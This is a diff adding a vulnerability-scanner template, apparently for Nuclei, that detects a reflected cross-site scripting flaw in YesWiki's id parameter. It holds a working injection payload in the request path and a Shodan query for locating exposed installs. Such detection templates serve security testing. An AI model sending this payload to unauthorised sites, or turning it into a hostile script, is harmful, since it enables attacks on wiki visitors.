@@ -1,0 +1,41 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <script>alert(document.domain)</script>
+            - 'Query failed:'
+        - part: header
+          type: word
+          words:
+            - text/html
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E'
+id: yeswiki-xss
+info:
+    author: arafatansari
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+        cvss-score: 6.5
+        cwe-id: CWE-79
+    description: |
+        YesWiki before 2022-07-07 contains a cross-site scripting vulnerability via the id parameter in the AccueiL URL.
+    metadata:
+        max-request: 1
+        shodan-query: http.html:"yeswiki"
+        verified: true
+    name: YesWiki <2022-07-07 - Cross-Site Scripting
+    reference:
+        - https://huntr.dev/bounties/de4db96c-2717-4c0e-b7aa-eee756ca19d3/
+    severity: medium
+    tags:
+        - yeswiki
+        - huntr
+        - Swiki
+        - YesWiki
